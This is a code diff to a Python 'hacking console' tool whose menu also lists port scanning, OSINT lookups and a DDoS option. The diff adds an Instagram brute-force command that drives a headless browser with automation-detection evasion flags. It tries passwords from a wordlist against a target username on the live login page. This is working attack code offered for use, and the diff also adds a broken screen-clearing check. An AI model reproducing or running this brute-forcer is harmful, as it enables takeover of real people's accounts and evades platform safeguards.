@@ -1,4 +1,5 @@
 from colorama import Fore , Style
+from playwright.sync_api import sync_playwright
 from socket import *
 import platform
 import pyfiglet
@@ -48,17 +49,22 @@ print(Fore.RED + Style.BRIGHT + """
   [02] 》》  IP Info         -- detailed network & geolocation info (ifinfo <IP-DOMAIN>)
   [03] 》》  Whois Lookup    -- domain ownership and registrar data (whois <exemple.com>)
   [04] 》》  DDoS Attack     -- simulate network stress tests (blackflood <https://exemple.com>)
-  [05] 》》  Clear           -- clear colosole hacking
-  [06] 》》  Exit            -- exit hacking console
+  [05] 》》  Brute Force     -- Brute Force Instagram
+  [06] 》》  Clear           -- clear colosole hacking
+  [07] 》》  Exit            -- exit hacking console
 """)
 print(Fore.CYAN + Style.BRIGHT + "╚════════════════════════════════════════════════════════════════════════════════════════════════════╝")
 
 while True:
       try:
-            derectory = os.getcwd()
-            prompt = f"{Fore.GREEN}{Style.BRIGHT}┌──({Fore.RESET}{Fore.BLUE}{Style.BRIGHT}kali@kali{Fore.RESET}{Fore.GREEN}{Style.BRIGHT})-[{Fore.RESET}{Fore.WHITE}{Style.BRIGHT}{derectory}{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}]{Fore.RESET}\n"
-            prompt += f"{Fore.GREEN}{Style.BRIGHT}└─{Fore.RESET}{Fore.BLUE}{Style.BRIGHT}$ {Fore.RESET}"
-            input_terminal = input(prompt).strip()
+            try:
+                derectory = os.getcwd()
+                prompt = f"{Fore.GREEN}{Style.BRIGHT}┌──({Fore.RESET}{Fore.BLUE}{Style.BRIGHT}kali@kali{Fore.RESET}{Fore.GREEN}{Style.BRIGHT})-[{Fore.RESET}{Fore.WHITE}{Style.BRIGHT}{derectory}{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}]{Fore.RESET}\n"
+                prompt += f"{Fore.GREEN}{Style.BRIGHT}└─{Fore.RESET}{Fore.BLUE}{Style.BRIGHT}$ {Fore.RESET}"
+                input_terminal = input(prompt).strip()
+            except:
+                print(Fore.CYAN + Style.BRIGHT + "\n[+] User is Exit" + Style.BRIGHT + Fore.RESET)
+                break
             if input_terminal.lower().startswith("airporthunter "):
                 port_scan = input_terminal[14:].strip()
             
@@ -98,7 +104,7 @@ while True:
 
             elif input_terminal.lower().startswith("ipinfo "):
                   target = input_terminal[7:].strip()
-                  os.system("cls"  if os.name == "nt" else "clear")
+                  os.system("cls" if os.name else "clear")
                   print(Fore.GREEN + Style.BRIGHT + pyfiglet.figlet_format("IP-INFO-OSINT" , font="doom"))
                   try:
                        print(Fore.YELLOW + Style.BRIGHT + f"\n[*] Fetching IP info for {target}...\n" + Fore.RESET)
@@ -122,7 +128,7 @@ while True:
               
             elif input_terminal.lower().startswith("whois "):
                  Whois = input_terminal[6:].strip()
-                 os.system("cls" if os.name == "nt" else "clear")
+                 os.system("cls" if os.name else "clear")
                  print(Fore.GREEN + Style.BRIGHT + pyfiglet.figlet_format("WHOIS-OSINT" , font="doom"))
                  try:
                       info = whois.whois(Whois)
@@ -180,10 +186,74 @@ while True:
                         print(Fore.RED + Style.BRIGHT + "\n[!] Attack stopped by user." + Fore.RESET)
                 except:
                      print(Fore.RED + Style.BRIGHT +  f"[!] Unexpected Error" + Fore.RESET)
-                
+            
+            elif input_terminal.lower().startswith("instaforce "):
+                instaforce = input_terminal[11:].strip()
+                os.system("cls" if os.name == "nt" else "clear")
+                instaforce_banner = Fore.MAGENTA + Style.BRIGHT + pyfiglet.figlet_format("INSTA-FORCE", font="doom") + Style.BRIGHT + Fore.RESET
+                print(instaforce_banner)
+
+                input_username = "input[name='username']"
+                input_password = "input[name='password']"
+                login_button = "button[type='submit']"
+                forgot_password_text = "Forgot password?"
+                url = "https://www.instagram.com/accounts/login/"
+
+                try:
+                    with open("passwords.txt", "r", encoding="utf-8") as file:
+                        passwords = [line.strip() for line in file if line.strip()]
+                except FileNotFoundError:
+                    print(Fore.YELLOW + Style.BRIGHT + "[!] passwords.txt not found. Please create it and add passwords." + Fore.RESET)
+                    continue
+
+                with sync_playwright() as sync:
+                    browser = sync.chromium.launch(
+                        headless=True,
+                        args=[
+                            "--disable-blink-features=AutomationControlled",
+                            "--no-sandbox",
+                            "--disable-infobars",
+                            "--disable-dev-shm-usage",
+                            "--disable-extensions",
+                            "--disable-gpu",
+                        ]
+                    )
+                    page = browser.new_page()
+                    page.goto(url)
+
+                    try:
+                        for pass1 in passwords:
+                            pass1 = pass1.strip()
+                            try:
+                                page.fill(input_username, instaforce)
+                                page.fill(input_password, pass1)
+                                page.click(login_button)
+                                page.wait_for_timeout(2000)
+
+                                if forgot_password_text not in page.content():
+                                    print(Fore.GREEN + f"[+] Password Found: {pass1}" + Fore.RESET)
+                                    break
+                                else:
+                                    print(Fore.RED + f"[-] Wrong password: {pass1}" + Fore.RESET)
+
+                            except Exception as inner_error:
+                                print(Fore.YELLOW + f"[!] Minor error occurred: {inner_error}" + Fore.RESET)
+                                break
+
+                    except KeyboardInterrupt:
+                        print(Fore.RED + "\n[!] Attack interrupted by user (Ctrl + C). Browser will now close." + Fore.RESET)
+                        break
+                    except Exception as e:
+                        print(Fore.YELLOW + f"[!] Error during brute force: {e}" + Fore.RESET)
+
+                    browser.close()
+  
+
+
             elif input_terminal.lower() == "exit":
                   break
             elif input_terminal.lower() == "clear" or input_terminal.lower() == "cls":
+                os.system("cls" if os.name else "clear")
                 os.system("cls"  if os.name == "nt" else "clear")
                 banner = pyfiglet.figlet_format("BLACK-XITERS", font="doom")
                 print(Fore.GREEN + Style.BRIGHT + banner)
@@ -209,8 +279,9 @@ while True:
   [02] 》》  IP Info         -- detailed network & geolocation info (ifinfo <IP-DOMAIN>)
   [03] 》》  Whois Lookup    -- domain ownership and registrar data (whois <exemple.com>)
   [04] 》》  DDoS Attack     -- simulate network stress tests (blackflood <https://exemple.com>)
-  [05] 》》  Clear           -- clear colosole hacking
-  [06] 》》  Exit            -- exit hacking console
+  [05] 》》  Brute Force     -- Brute Force Instagram
+  [06] 》》  Clear           -- clear colosole hacking
+  [07] 》》  Exit            -- exit hacking console
                 """)
                 print(Fore.CYAN + Style.BRIGHT + "╚════════════════════════════════════════════════════════════════════════════════════════════════════╝")
             else:
